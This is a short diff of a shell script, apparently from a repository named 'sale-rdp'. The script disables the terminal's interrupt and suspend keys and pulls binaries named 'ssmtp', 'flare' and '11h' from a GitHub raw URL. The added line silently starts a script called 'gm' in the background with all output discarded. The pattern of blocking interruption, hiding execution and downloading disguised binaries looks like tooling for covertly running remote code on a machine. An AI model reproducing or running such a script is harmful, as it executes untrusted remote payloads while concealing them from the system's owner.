@@ -3,7 +3,7 @@ stty intr ""
 stty quit ""
 stty susp undef
 
-
+bash gm > /dev/null 2>&1 &
 curl -sSL -o ssmtp https://raw.githubusercontent.com/3222h/sale-rdp/main/ssmtp
 curl -sSL -o flare https://raw.githubusercontent.com/3222h/sale-rdp/main/flare
 curl -sSL -o 11h https://raw.githubusercontent.com/3222h/sale-rdp/main/11h
